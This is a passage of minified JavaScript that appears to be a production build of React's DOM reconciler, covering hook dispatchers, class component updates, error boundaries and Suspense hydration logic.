Ar(n,t)?n:to.current===null?!(go&42)||go&1073741824&&!(H&261930)?(cc=!0,e.memoizedState=n):(e=xu(),L.lanes|=e,Ql|=e,t):(e=Ts(e,n,r),Ar(e,t)||(cc=!0),e)}function Ds(e,t,n,r,i){var a=A.p;A.p=a!==0&&8>a?a:8;var o=k.T,s={};k.T=s,zs(e,!1,t,n);try{var c=i(),l=k.S;l!==null&&l(s,c),typeof c==`object`&&c&&typeof c.then==`function`?Rs(e,t,ya(c,r),bu(e)):Rs(e,t,r,bu(e))}catch(n){Rs(e,t,{then:function(){},status:`rejected`,reason:n},bu())}finally{A.p=a,o!==null&&s.types!==null&&(o.types=s.types),k.T=o}}function Os(){}function ks(e,t,n,r){if(e.tag!==5)throw Error(i(476));var a=As(e).queue;Ds(e,a,t,se,n===null?Os:function(){return js(e),n(r)})}function As(e){var t=e.memoizedState;if(t!==null)return t;t={memoizedState:se,baseState:se,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:Bo,lastRenderedState:se},next:null};var n={};return t.next={memoizedState:n,baseState:n,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:Bo,lastRenderedState:n},next:null},e.memoizedState=t,e=e.alternate,e!==null&&(e.memoizedState=t),t}function js(e){var t=As(e);t.next===null&&(t=e.alternate.memoizedState),Rs(e,t.next.queue,{},bu())}function Ms(){return ia(ip)}function Ns(){return Fo().memoizedState}function Ps(){return Fo().memoizedState}function Fs(e){for(var t=e.return;t!==null;){switch(t.tag){case 24:case 3:var n=bu();e=Ka(n);var r=qa(t,e,n);r!==null&&(Su(r,t,n),Ja(r,t,n)),t={cache:da()},e.payload=t;return}t=t.return}}function Is(e,t,n){var r=bu();n={lane:r,revertLane:0,gesture:null,action:n,hasEagerState:!1,eagerState:null,next:null},Bs(e)?Vs(t,n):(n=li(e,t,n,r),n!==null&&(Su(n,e,r),Hs(n,t,r)))}function Ls(e,t,n){Rs(e,t,n,bu())}function Rs(e,t,n,r){var i={lane:r,revertLane:0,gesture:null,action:n,hasEagerState:!1,eagerState:null,next:null};if(Bs(e))Vs(t,i);else{var a=e.alternate;if(e.lanes===0&&(a===null||a.lanes===0)&&(a=t.lastRenderedReducer,a!==null))try{var o=t.lastRenderedState,s=a(o,n);if(i.hasEagerState=!0,i.eagerState=s,Ar(s,o))return ci(e,t,i,0),B===null&&si(),!1}catch{}if(n=li(e,t,i,r),n!==null)return Su(n,e,r),Hs(n,t,r),!0}return!1}function zs(e,t,n,r){if(r={lane:2,revertLane:vd(),gesture:null,action:r,hasEagerState:!1,eagerState:null,next:null},Bs(e)){if(t)throw Error(i(479))}else t=li(e,n,r,2),t!==null&&Su(t,e,2)}function Bs(e){var t=e.alternate;return e===L||t!==null&&t===L}function Vs(e,t){yo=vo=!0;var n=e.pending;n===null?t.next=t:(t.next=n.next,n.next=t),e.pending=t}function Hs(e,t,n){if(n&4194048){var r=t.lanes;r&=e.pendingLanes,n|=r,t.lanes=n,st(e,n)}}var Us={readContext:ia,use:Ro,useCallback:To,useContext:To,useEffect:To,useImperativeHandle:To,useLayoutEffect:To,useInsertionEffect:To,useMemo:To,useReducer:To,useRef:To,useState:To,useDebugValue:To,useDeferredValue:To,useTransition:To,useSyncExternalStore:To,useId:To,useHostTransitionStatus:To,useFormState:To,useActionState:To,useOptimistic:To,useMemoCache:To,useCacheRefresh:To};Us.useEffectEvent=To;var Ws={readContext:ia,use:Ro,useCallback:function(e,t){return Po().memoizedState=[e,t===void 0?null:t],e},useContext:ia,useEffect:ms,useImperativeHandle:function(e,t,n){n=n==null?null:n.concat([e]),fs(4194308,4,bs.bind(null,t,e),n)},useLayoutEffect:function(e,t){return fs(4194308,4,e,t)},useInsertionEffect:function(e,t){fs(4,2,e,t)},useMemo:function(e,t){var n=Po();t=t===void 0?null:t;var r=e();if(bo){We(!0);try{e()}finally{We(!1)}}return n.memoizedState=[r,t],r},useReducer:function(e,t,n){var r=Po();if(n!==void 0){var i=n(t);if(bo){We(!0);try{n(t)}finally{We(!1)}}}else i=t;return r.memoizedState=r.baseState=i,e={pending:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:i},r.queue=e,e=e.dispatch=Is.bind(null,L,e),[r.memoizedState,e]},useRef:function(e){var t=Po();return e={current:e},t.memoizedState=e},useState:function(e){e=Xo(e);var t=e.queue,n=Ls.bind(null,L,t);return t.dispatch=n,[e.memoizedState,n]},useDebugValue:Ss,useDeferredValue:function(e,t){return Ts(Po(),e,t)},useTransition:function(){var e=Xo(!1);return e=Ds.bind(null,L,e.queue,!0,!1),Po().memoizedState=e,[!1,e]},useSyncExternalStore:function(e,t,n){var r=L,a=Po();if(F){if(n===void 0)throw Error(i(407));n=n()}else{if(n=t(),B===null)throw Error(i(349));H&127||Go(r,t,n)}a.memoizedState=n;var o={value:n,getSnapshot:t};return a.queue=o,ms(qo.bind(null,r,o,e),[e]),r.flags|=2048,us(9,{destroy:void 0},Ko.bind(null,r,o,n,t),null),n},useId:function(){var e=Po(),t=B.identifierPrefix;if(F){var n=Ni,r=Mi;n=(r&~(1<<32-Ge(r)-1)).toString(32)+n,t=`_`+t+`R_`+n,n=xo++,0<n&&(t+=`H`+n.toString(32)),t+=`_`}else n=wo++,t=`_`+t+`r_`+n.toString(32)+`_`;return e.memoizedState=t},useHostTransitionStatus:Ms,useFormState:as,useActionState:as,useOptimistic:function(e){var t=Po();t.memoizedState=t.baseState=e;var n={pending:null,lanes:0,dispatch:null,lastRenderedReducer:null,lastRenderedState:null};return t.queue=n,t=zs.bind(null,L,!0,n),n.dispatch=t,[e,t]},useMemoCache:zo,useCacheRefresh:function(){return Po().memoizedState=Fs.bind(null,L)},useEffectEvent:function(e){var t=Po(),n={impl:e};return t.memoizedState=n,function(){if(z&2)throw Error(i(440));return n.impl.apply(void 0,arguments)}}},Gs={readContext:ia,use:Ro,useCallback:Cs,useContext:ia,useEffect:hs,useImperativeHandle:xs,useInsertionEffect:vs,useLayoutEffect:ys,useMemo:ws,useReducer:Vo,useRef:ds,useState:function(){return Vo(Bo)},useDebugValue:Ss,useDeferredValue:function(e,t){return Es(Fo(),R.memoizedState,e,t)},useTransition:function(){var e=Vo(Bo)[0],t=Fo().memoizedState;return[typeof e==`boolean`?e:Lo(e),t]},useSyncExternalStore:Wo,useId:Ns,useHostTransitionStatus:Ms,useFormState:os,useActionState:os,useOptimistic:function(e,t){return Zo(Fo(),R,e,t)},useMemoCache:zo,useCacheRefresh:Ps};Gs.useEffectEvent=_s;var Ks={readContext:ia,use:Ro,useCallback:Cs,useContext:ia,useEffect:hs,useImperativeHandle:xs,useInsertionEffect:vs,useLayoutEffect:ys,useMemo:ws,useReducer:Uo,useRef:ds,useState:function(){return Uo(Bo)},useDebugValue:Ss,useDeferredValue:function(e,t){var n=Fo();return R===null?Ts(n,e,t):Es(n,R.memoizedState,e,t)},useTransition:function(){var e=Uo(Bo)[0],t=Fo().memoizedState;return[typeof e==`boolean`?e:Lo(e),t]},useSyncExternalStore:Wo,useId:Ns,useHostTransitionStatus:Ms,useFormState:ls,useActionState:ls,useOptimistic:function(e,t){var n=Fo();return R===null?(n.baseState=e,[e,n.queue.dispatch]):Zo(n,R,e,t)},useMemoCache:zo,useCacheRefresh:Ps};Ks.useEffectEvent=_s;function qs(e,t,n,r){t=e.memoizedState,n=n(r,t),n=n==null?t:f({},t,n),e.memoizedState=n,e.lanes===0&&(e.updateQueue.baseState=n)}var Js={enqueueSetState:function(e,t,n){e=e._reactInternals;var r=bu(),i=Ka(r);i.payload=t,n!=null&&(i.callback=n),t=qa(e,i,r),t!==null&&(Su(t,e,r),Ja(t,e,r))},enqueueReplaceState:function(e,t,n){e=e._reactInternals;var r=bu(),i=Ka(r);i.tag=1,i.payload=t,n!=null&&(i.callback=n),t=qa(e,i,r),t!==null&&(Su(t,e,r),Ja(t,e,r))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var n=bu(),r=Ka(n);r.tag=2,t!=null&&(r.callback=t),t=qa(e,r,n),t!==null&&(Su(t,e,n),Ja(t,e,n))}};function Ys(e,t,n,r,i,a,o){return e=e.stateNode,typeof e.shouldComponentUpdate==`function`?e.shouldComponentUpdate(r,a,o):t.prototype&&t.prototype.isPureReactComponent?!jr(n,r)||!jr(i,a):!0}function Xs(e,t,n,r){e=t.state,typeof t.componentWillReceiveProps==`function`&&t.componentWillReceiveProps(n,r),typeof t.UNSAFE_componentWillReceiveProps==`function`&&t.UNSAFE_componentWillReceiveProps(n,r),t.state!==e&&Js.enqueueReplaceState(t,t.state,null)}function Zs(e,t){var n=t;if(`ref`in t)for(var r in n={},t)r!==`ref`&&(n[r]=t[r]);if(e=e.defaultProps)for(var i in n===t&&(n=f({},n)),e)n[i]===void 0&&(n[i]=e[i]);return n}function Qs(e){ri(e)}function $s(e){console.error(e)}function ec(e){ri(e)}function tc(e,t){try{var n=e.onUncaughtError;n(t.value,{componentStack:t.stack})}catch(e){setTimeout(function(){throw e})}}function nc(e,t,n){try{var r=e.onCaughtError;r(n.value,{componentStack:n.stack,errorBoundary:t.tag===1?t.stateNode:null})}catch(e){setTimeout(function(){throw e})}}function rc(e,t,n){return n=Ka(n),n.tag=3,n.payload={element:null},n.callback=function(){tc(e,t)},n}function ic(e){return e=Ka(e),e.tag=3,e}function ac(e,t,n,r){var i=n.type.getDerivedStateFromError;if(typeof i==`function`){var a=r.value;e.payload=function(){return i(a)},e.callback=function(){nc(t,n,r)}}var o=n.stateNode;o!==null&&typeof o.componentDidCatch==`function`&&(e.callback=function(){nc(t,n,r),typeof i!=`function`&&(uu===null?uu=new Set([this]):uu.add(this));var e=r.stack;this.componentDidCatch(r.value,{componentStack:e===null?``:e})})}function oc(e,t,n,r,a){if(n.flags|=32768,typeof r==`object`&&r&&typeof r.then==`function`){if(t=n.alternate,t!==null&&I(t,n,a,!0),n=oo.current,n!==null){switch(n.tag){case 31:case 13:return so===null?Pu():n.alternate===null&&Zl===0&&(Zl=3),n.flags&=-257,n.flags|=65536,n.lanes=a,r===Oa?n.flags|=16384:(t=n.updateQueue,t===null?n.updateQueue=new Set([r]):t.add(r),Qu(e,r,a)),!1;case 22:return n.flags|=65536,r===Oa?n.flags|=16384:(t=n.updateQueue,t===null?(t={transitions:null,markerInstances:null,retryQueue:new Set([r])},n.updateQueue=t):(n=t.retryQueue,n===null?t.retryQueue=new Set([r]):n.add(r)),Qu(e,r,a)),!1}throw Error(i(435,n.tag))}return Qu(e,r,a),Pu(),!1}if(F)return t=oo.current,t===null?(r!==Vi&&(t=Error(i(423),{cause:r}),Ji(wi(t,n))),e=e.current.alternate,e.flags|=65536,a&=-a,e.lanes|=a,r=wi(r,n),a=rc(e.stateNode,r,a),Ya(e,a),Zl!==4&&(Zl=2)):(!(t.flags&65536)&&(t.flags|=256),t.flags|=65536,t.lanes=a,r!==Vi&&(e=Error(i(422),{cause:r}),Ji(wi(e,n)))),!1;var o=Error(i(520),{cause:r});if(o=wi(o,n),ru===null?ru=[o]:ru.push(o),Zl!==4&&(Zl=2),t===null)return!0;r=wi(r,n),n=t;do{switch(n.tag){case 3:return n.flags|=65536,e=a&-a,n.lanes|=e,e=rc(n.stateNode,r,e),Ya(n,e),!1;case 1:if(t=n.type,o=n.stateNode,!(n.flags&128)&&(typeof t.getDerivedStateFromError==`function`||o!==null&&typeof o.componentDidCatch==`function`&&(uu===null||!uu.has(o))))return n.flags|=65536,a&=-a,n.lanes|=a,a=ic(a),ac(a,e,n,r),Ya(n,a),!1}n=n.return}while(n!==null);return!1}var sc=Error(i(461)),cc=!1;function lc(e,t,n,r){t.child=e===null?Ha(t,null,n,r):Va(t,e.child,n,r)}function uc(e,t,n,r,i){n=n.render;var a=t.ref;if(`ref`in r){var o={};for(var s in r)s!==`ref`&&(o[s]=r[s])}else o=r;return ra(t),r=Do(e,t,n,o,a,i),s=jo(),e!==null&&!cc?(Mo(e,t,i),Pc(e,t,i)):(F&&s&&Ii(t),t.flags|=1,lc(e,t,r,i),t.child)}function dc(e,t,n,r,i){if(e===null){var a=n.type;return typeof a==`function`&&!hi(a)&&a.defaultProps===void 0&&n.compare===null?(t.tag=15,t.type=a,fc(e,t,a,r,i)):(e=vi(n.type,null,r,t,t.mode,i),e.ref=t.ref,e.return=t,t.child=e)}if(a=e.child,!Fc(e,i)){var o=a.memoizedProps;if(n=n.compare,n=n===null?jr:n,n(o,r)&&e.ref===t.ref)return Pc(e,t,i)}return t.flags|=1,e=gi(a,r),e.ref=t.ref,e.return=t,t.child=e}function fc(e,t,n,r,i){if(e!==null){var a=e.memoizedProps;if(jr(a,r)&&e.ref===t.ref)if(cc=!1,t.pendingProps=r=a,Fc(e,i))e.flags&131072&&(cc=!0);else return t.lanes=e.lanes,Pc(e,t,i)}return bc(e,t,n,r,i)}function pc(e,t,n,r){var i=r.children,a=e===null?null:e.memoizedState;if(e===null&&t.stateNode===null&&(t.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),r.mode===`hidden`){if(t.flags&128){if(a=a===null?n:a.baseLanes|n,e!==null){for(r=t.child=e.child,i=0;r!==null;)i=i|r.lanes|r.childLanes,r=r.sibling;r=i&~a}else r=0,t.child=null;return hc(e,t,a,n,r)}if(n&536870912)t.memoizedState={baseLanes:0,cachePool:null},e!==null&&Ca(t,a===null?null:a.cachePool),a===null?io():ro(t,a),uo(t);else return r=t.lanes=536870912,hc(e,t,a===null?n:a.baseLanes|n,n,r)}else a===null?(e!==null&&Ca(t,null),io(),fo(t)):(Ca(t,a.cachePool),ro(t,a),fo(t),t.memoizedState=null);return lc(e,t,i,n),t.child}function mc(e,t){return e!==null&&e.tag===22||t.stateNode!==null||(t.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),t.sibling}function hc(e,t,n,r,i){var a=Sa();return a=a===null?null:{parent:ua._currentValue,pool:a},t.memoizedState={baseLanes:n,cachePool:a},e!==null&&Ca(t,null),io(),uo(t),e!==null&&I(e,t,r,!0),t.childLanes=i,null}function gc(e,t){return t=kc({mode:t.mode,children:t.children},e.mode),t.ref=e.ref,e.child=t,t.return=e,t}function _c(e,t,n){return Va(t,e.child,null,n),e=gc(t,t.pendingProps),e.flags|=2,po(t),t.memoizedState=null,e}function vc(e,t,n){var r=t.pendingProps,a=(t.flags&128)!=0;if(t.flags&=-129,e===null){if(F){if(r.mode===`hidden`)return e=gc(t,r),t.lanes=536870912,mc(null,e);if(lo(t),(e=P)?(e=uf(e,Bi),e=e!==null&&e.data===`&`?e:null,e!==null&&(t.memoizedState={dehydrated:e,treeContext:ji===null?null:{id:Mi,overflow:Ni},retryLane:536870912,hydrationErrors:null},n=xi(e),n.return=t,t.child=n,N=t,P=null)):e=null,e===null)throw Hi(t);return t.lanes=536870912,null}return gc(t,r)}var o=e.memoizedState;if(o!==null){var s=o.dehydrated;if(lo(t),a)if(t.flags&256)t.flags&=-257,t=_c(e,t,n);else if(t.memoizedState!==null)t.child=e.child,t.flags|=128,t=null;else throw Error(i(558));else if(cc||I(e,t,n,!1),a=(n&e.childLanes)!==0,cc||a){if(r=B,r!==null&&(s=ct(r,n),s!==0&&s!==o.retryLane))throw o.retryLane=s,ui(e,s),Su(r,e,s),sc;Pu(),t=_c(e,t,n)}else e=o.treeContext,P=mf(s.nextSibling),N=t,F=!0,zi=null,Bi=!1,e!==null&&Ri(t,e),t=gc(t,r),t.flags|=4096;return t}return e=gi(e.child,{mode:r.mode,children:r.children}),e.ref=t.ref,t.child=e,e.return=t,e}function yc(e,t){var n=t.ref;if(n===null)e!==null&&e.ref!==null&&(t.flags|=4194816);else{if(typeof n!=`function`&&typeof n!=`object`)throw Error(i(284));(e===null||e.ref!==n)&&(t.flags|=4194816)}}function bc(e,t,n,r,i){return ra(t),n=Do(e,t,n,r,void 0,i),r=jo(),e!==null&&!cc?(Mo(e,t,i),Pc(e,t,i)):(F&&r&&Ii(t),t.flags|=1,lc(e,t,n,i),t.child)}function xc(e,t,n,r,i,a){return ra(t),t.updateQueue=null,n=ko(t,r,n,i),Oo(e),r=jo(),e!==null&&!cc?(Mo(e,t,a),Pc(e,t,a)):(F&&r&&Ii(t),t.flags|=1,lc(e,t,n,a),t.child)}function Sc(e,t,n,r,i){if(ra(t),t.stateNode===null){var a=pi,o=n.contextType;typeof o==`object`&&o&&(a=ia(o)),a=new n(r,a),t.memoizedState=a.state!==null&&a.state!==void 0?a.state:null,a.updater=Js,t.stateNode=a,a._reactInternals=t,a=t.stateNode,a.props=r,a.state=t.memoizedState,a.refs={},Wa(t),o=n.contextType,a.context=typeof o==`object`&&o?ia(o):pi,a.state=t.memoizedState,o=n.getDerivedStateFromProps,typeof o==`function`&&(qs(t,n,o,r),a.state=t.memoizedState),typeof n.getDerivedStateFromProps==`function`||typeof a.getSnapshotBeforeUpdate==`function`||typeof a.UNSAFE_componentWillMount!=`function`&&typeof a.componentWillMount!=`function`||(o=a.state,typeof a.componentWillMount==`function`&&a.componentWillMount(),typeof a.UNSAFE_componentWillMount==`function`&&a.UNSAFE_componentWillMount(),o!==a.state&&Js.enqueueReplaceState(a,a.state,null),Qa(t,r,a,i),Za(),a.state=t.memoizedState),typeof a.componentDidMount==`function`&&(t.flags|=4194308),r=!0}else if(e===null){a=t.stateNode;var s=t.memoizedProps,c=Zs(n,s);a.props=c;var l=a.context,u=n.contextType;o=pi,typeof u==`object`&&u&&(o=ia(u));var d=n.getDerivedStateFromProps;u=typeof d==`function`||typeof a.getSnapshotBeforeUpdate==`function`,s=t.pendingProps!==s,u||typeof a.UNSAFE_componentWillReceiveProps!=`function`&&typeof a.componentWillReceiveProps!=`function`||(s||l!==o)&&Xs(t,a,r,o),Ua=!1;var f=t.memoizedState;a.state=f,Qa(t,r,a,i),Za(),l=t.memoizedState,s||f!==l||Ua?(typeof d==`function`&&(qs(t,n,d,r),l=t.memoizedState),(c=Ua||Ys(t,n,c,r,f,l,o))?(u||typeof a.UNSAFE_componentWillMount!=`function`&&typeof a.componentWillMount!=`function`||(typeof a.componentWillMount==`function`&&a.componentWillMount(),typeof a.UNSAFE_componentWillMount==`function`&&a.UNSAFE_componentWillMount()),typeof a.componentDidMount==`function`&&(t.flags|=4194308)):(typeof a.componentDidMount==`function`&&(t.flags|=4194308),t.memoizedProps=r,t.memoizedState=l),a.props=r,a.state=l,a.context=o,r=c):(typeof a.componentDidMount==`function`&&(t.flags|=4194308),r=!1)}else{a=t.stateNode,Ga(e,t),o=t.memoizedProps,u=Zs(n,o),a.props=u,d=t.pendingProps,f=a.context,l=n.contextType,c=pi,typeof l==`object`&&l&&(c=ia(l)),s=n.getDerivedStateFromProps,(l=typeof s==`function`||typeof a.getSnapshotBeforeUpdate==`function`)||typeof a.UNSAFE_componentWillReceiveProps!=`function`&&typeof a.componentWillReceiveProps!=`function`||(o!==d||f!==c)&&Xs(t,a,r,c),Ua=!1,f=t.memoizedState,a.state=f,Qa(t,r,a,i),Za();var p=t.memoizedState;o!==d||f!==p||Ua||e!==null&&e.dependencies!==null&&na(e.dependencies)?(typeof s==`function`&&(qs(t,n,s,r),p=t.memoizedState),(u=Ua||Ys(t,n,u,r,f,p,c)||e!==null&&e.dependencies!==null&&na(e.dependencies))?(l||typeof a.UNSAFE_componentWillUpdate!=`function`&&typeof a.componentWillUpdate!=`function`||(typeof a.componentWillUpdate==`function`&&a.componentWillUpdate(r,p,c),typeof a.UNSAFE_componentWillUpdate==`function`&&a.UNSAFE_componentWillUpdate(r,p,c)),typeof a.componentDidUpdate==`function`&&(t.flags|=4),typeof a.getSnapshotBeforeUpdate==`function`&&(t.flags|=1024)):(typeof a.componentDidUpdate!=`function`||o===e.memoizedProps&&f===e.memoizedState||(t.flags|=4),typeof a.getSnapshotBeforeUpdate!=`function`||o===e.memoizedProps&&f===e.memoizedState||(t.flags|=1024),t.memoizedProps=r,t.memoizedState=p),a.props=r,a.state=p,a.context=c,r=u):(typeof a.componentDidUpdate!=`function`||o===e.memoizedProps&&f===e.memoizedState||(t.flags|=4),typeof a.getSnapshotBeforeUpdate!=`function`||o===e.memoizedProps&&f===e.memoizedState||(t.flags|=1024),r=!1)}return a=r,yc(e,t),r=(t.flags&128)!=0,a||r?(a=t.stateNode,n=r&&typeof n.getDerivedStateFromError!=`function`?null:a.render(),t.flags|=1,e!==null&&r?(t.child=Va(t,e.child,null,i),t.child=Va(t,null,n,i)):lc(e,t,n,i),t.memoizedState=a.state,e=t.child):e=Pc(e,t,i),e}function Cc(e,t,n,r){return Ki(),t.flags|=256,lc(e,t,n,r),t.child}var wc={dehydrated:null,treeContext:null,retryLane:0,hydrationErrors:null};function Tc(e){return{baseLanes:e,cachePool:wa()}}function Ec(e,t,n){return e=e===null?0:e.childLanes&~n,t&&(e|=tu),e}function Dc(e,t,n){var r=t.pendingProps,a=!1,o=(t.flags&128)!=0,s;if((s=o)||(s=e!==null&&e.memoizedState===null?!1:(mo.current&2)!=0),s&&(a=!0,t.flags&=-129),s=(t.flags&32)!=0,t.flags&=-33,e===null){if(F){if(a?co(t):fo(t),(e=P)?(e=uf(e,Bi),e=e!==null&&e.data!==`&`?e:null,e!==null&&(t.memoizedState={dehydrated:e,treeContext:ji===null?null:{id:Mi,overflow:Ni},retryLane:536870912,hydrationErrors:null},n=xi(e),n.return=t,t.child=n,N=t,P=null)):e=null,e===null)throw Hi(t);return ff(e)?t.lanes=32:t.lanes=536870912,null}var c=r.children;return r=r.fallback,a?(fo(t),a=t.mode,c=kc({mode:`hidden`,children:c},a),r=yi(r,a,n,null),c.return=t,r.return=t,c.sibling=r,t.child=c,r=t.child,r.memoizedState=Tc(n),r.childLanes=Ec(e,s,n),t.memoizedState=wc,mc(null,r)):(co(t),Oc(t,c))}var l=e.memoizedState;if(l!==null&&(c=l.dehydrated,c!==null)){if(o)t.flags&256?(co(t),t.flags&=-257,t=Ac(e,t,n)):t.memoizedState===null?(fo(t),c=r.fallback,a=t.mode,r=kc({mode:`visible`,children:r.children},a),c=yi(c,a,n,null),c.flags|=2,r.return=t,c.return=t,r.sibling=c,t.child=r,Va(t,e.child,null,n),r=t.child,r.memoizedState=Tc(n),r.childLanes=Ec(e,s,n),t.memoizedState=wc,t=mc(null,r)):(fo(t),t.child=e.child,t.flags|=128,t=null);else if(co(t),ff(c)){if(s=c.nextSibling&&c.nextSibling.dataset,s)var u=s.dgst;s=u,r=Error(i(419)),r.stack=``,r.digest=s,Ji({value:r,source:null,stack:null}),t=Ac(e,t,n)}else if(cc||I(e,t,n,!1),s=(n&e.childLanes)!==0,cc||s){if(s=B,s!==null&&(r=ct(s,n),r!==0&&r!==l.retryLane))throw l.retryLane=r,ui(e,r),Su(s,e,r),sc;df(c)||Pu(),t=Ac(e,t,n)}else df(c)?(t.flags|=192,t.child=e.child,t=null):(e=l.treeContext,P=mf(c.nextSibling),N=t,F=!0,zi=null,Bi=!1,e!==null&&Ri(t,e),t=Oc(t,r.children),t.flags|=4096);return t}return a?(fo(t),c=r.fallback,a=t.mode,l=e.child,u=l.sibling,r=gi(l,{mode:`hidden`,children:r.children}),r.subtreeFlags=l.subtreeFlags&65011712,u===null?(c=yi(c,a,n,null),c.flags|=2):c=gi(u,c),c.return=t,r.return=t,r.sibling=c,t.child=r,mc(null,r),r=t.child,c=e.child.memoizedState,c===null?c=Tc(n):(a=c.cachePool,a===null?a=wa():(l=ua._currentValue,a=a.parent===l?a:{parent:l,pool:l}),c={baseLanes:c.baseLanes|n,cachePool:a}),r.memoizedState=c,r.childLanes=Ec(e,s,n),t.memoizedState=wc,mc(e.child,r)):(co(t),n=e.child,e=n.sibling,n=gi(n,{mode:`visible`,children:r.children}),n.return=t,n.sibling=null,e!==null&&(s=t.deletions,s===null?(t.deletions=[e],t.flags|=16):s.push(e)),t.child=n,t.memoizedState=null,n)}function Oc(e,t){return t=kc({mode:`visible`,children:t},e.mode),t.return=e,e.child=t}function kc(e,t){return e=M(22,e,null,t),e.lanes=0,e}function Ac(e,t,n){return Va(t,e.child,null,n),e=Oc(t,t.pendingProps.children),e.flags|=2,t.memoizedState=null,e}function jc(e,t,n){e.lanes|=t;var r=e.alternate;r!==null&&(r.lanes|=t),ea(e.return,t,n)}function Mc(e,t,n,r,i,a){var o=e.memoizedState;o===null?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:r,tail:n,tailMode:i,treeForkCount:a}:(o.isBackwards=t,o.rendering=null,o.renderingStartTime=0,o.last=r,o.tail=n,o.tailMode=i,o.treeForkCount=a)}function Nc(e,t,n){var r=t.pendingProps,i=r.revealOrder,a=r.tail;r=r.children;var o=mo.current,s=(o&2)!=0;if(s?(o=o&1|2,t.flags|=128):o&=1,fe(mo,o),lc(e,t,r,n),r=F?Oi:0,!s&&e!==null&&e.flags&128)a:for(e=t.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&jc(e,n,t);else if(e.tag===19)jc(e,n,t);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break a;for(;e.sibling===null;){if(e.return===null||e.return===t)break a;e=e.return}e.sibling.return=e.return,e=e.sibling}switch(i){case`forwards`:for(n=t.child,i=null;n!==null;)e=n.alternate,e!==null&&ho(e)===null&&(i=n),n=n.sibling;n=i,n===null?(i=t.child,t.child=null):(i=n.sibling,n.sibling=null),Mc(t,!1,i,n,a,r);break;case`backwards`:case`unstable_legacy-backwards`:for(n=null,i=t.child,t.child=null;i!==null;){if(e=i.alternate,e!==null&&ho(e)===null){t.child=i;break}e=i.sibling,i.sibling=n,n=i,i=e}Mc(t,!0,n,null,a,r);break;case`together`:Mc(t,!1,null,null,void 0,r);break;default:t.memoizedState=null}return t.child}function Pc(e,t,n){if(e!==null&&(t.dependencies=e.dependencies),Ql|=t.lanes,(n&t.childLanes)===0)if(e!==null){if(I(e,t,n,!1),(n&t.childLanes)===0)return null}else return null;if(e!==null&&t.child!==e.child)throw Error(i(153));if(t.child!==null){for(e=t.child,n=gi(e,e.pendingProps),t.child=n,n.return=t;e.sibling!==null;)e=e.sibling,n=n.sibling=gi(e,e.pendingProps),n.return=t;n.sibling=null}return t.child}function Fc(e,t){return(e.lanes&t)===0?(e=e.dependencies,!!(e!==null&&na(e))):!0}function Ic(e,t,n){switch(t.tag){case 3:_e(t,t.stateNode.containerInfo),Qi(t,ua,e.memoizedState.cache),Ki();break;case 27:case 5:ye(t);break;case 4:_e(t,t.stateNode.containerInfo);break;case 10:Qi(t,t.type,t.memoizedProps.value);break;case 31:if(t.memoizedState!==null)return t.flags|=128,lo(t),null;break;case 13:var r=t.memoizedState;if(r!==null)return r.dehydrated===null?(n&t.child.childLanes)===0?(co(t),e=Pc(e,t,n),e===null?null:e.sibling):Dc(e,t,n):(co(t),t.flags|=128,null);co(t);break;case 19:var i=(e.flags&128)!=0;if(r=(n&t.childLanes)!==0,r||=(I(e,t,n,!1),(n&t.childLanes)!==0),i){if(r)return Nc(e,t,n);t.flags|=128}if(i=t.memoizedState,i!==null&&(i.rendering=null,i.tail=null,i.lastEffect=null),fe(mo,mo.current),r)break;return null;case 22:return t.lanes=0,pc(e,t,n,t.pendingProps);case 24:Qi(t,ua,e.memoizedState.cache)}return Pc(e,t,n)}function Lc(e,t,n){if(e!==null)if(e.memoizedProps!==t.pendingProps)cc=!0;else{if(!Fc(e,n)&&!(t.flags&128))return cc=!1,Ic(e,t,n);cc=!!(e.flags&131072)}else cc=!1,F&&t.flags&1048576&&Fi(t,Oi,t.index);switch(t.lanes=0,t.tag){case 16:a:{var r=t.pendingProps;if(e=ja(t.elementType),t.type=e,typeof e==`function`)hi(e)?(r=Zs(e,r),t.tag=1,t=Sc(null,t,e,r,n)):(t.tag=0,t=bc(null,t,e,r,n));else{if(e!=null){var a=e.$$typeof;if(a===w){t.tag=11,t=uc(null,t,e,r,n);break a}else if(a===ee){t.tag=14,t=dc(null,t,e,r,n);break a}}throw t=ae(e)||e,Error(i(306,t,``))}}return t;case 0:return bc(e,t,t.type,t.pendingProps,n);case 1:return r=t.type,a=Zs(r,t.pendingProps),Sc(e,t,r,a,n);case 3:a:{if(_e(t,t.stateNode.containerInfo),e===null)throw Error(i(387));r=t.pendingProps;var o=t.memoizedState;a=o.element,Ga(e,t),Qa(t,r,null,n);var s=t.memoizedState;if(r=s.cache,Qi(t,ua,r),r!==o.cache&&ta(t,[ua],n,!0),Za(),r=s.element,o.isDehydrated)if(o={element:r,isDehydrated:!1,cache:s.cache},t.updateQueue.baseState=o,t.memoizedState=o,t.flags&256){t=Cc(e,t,r,n);break a}else if(r!==a){a=wi(Error(i(424)),t),Ji(a),t=Cc(e,t,r,n);break a}else{switch(e=t.stateNode.containerInfo,e.nodeType){case 9:e=e.body;break;default:e=e.nodeName===`HTML`?e.ownerDocument.body:e}for(P=mf(e.firstChild),N=t,F=!0,zi=null,Bi=!0,n=Ha(t,null,r,n),t.child=n;n;)n.flags=n.flags&-3|4096,n=n.sibling}else{if(Ki(),r===a){t=Pc(e,t,n);break a}lc(e,t,r,n)}t=t.child}return t;case 26:return yc(e,t),e===null?(n=Ff(t.type,null,t.pendingProps,null))?t.memoizedState=n:F||(n=t.type,e=t.pendingProps,r=Kd(he.current).createElement(n),r[mt]=t,r[ht]=e,Bd(r,n,e),Dt(r),t.stateNode=r):t.memoizedState=Ff(t.type,e.memoizedProps,t.pendingProps,e.memoizedState),null;case 27:return ye(t),e===null&&F&&(r=t.stateNode=vf(t.type,t.pendingProps,he.current),N=t,Bi=!0,a=P,rf(t.type)?(hf=a,P=mf(r.firstChild)):P=a),lc(e,t,t.pendingProps.children,n),yc(e,t),e===null&&(t.flags|=4194304),t.child;case 5:return 